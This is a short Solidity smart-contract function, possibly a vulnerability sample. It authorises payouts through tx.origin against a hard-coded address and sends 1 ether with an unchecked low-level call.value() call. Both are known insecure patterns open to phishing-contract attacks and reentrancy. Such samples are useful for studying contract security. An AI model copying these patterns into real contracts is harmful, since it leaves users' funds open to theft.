function transfer() public payable
 { 

 require(tx.origin == 0xb2930B35844a230f00E51431aCAe96Fe543a0347);  
msg.sender.call.value(1 ether)();

}
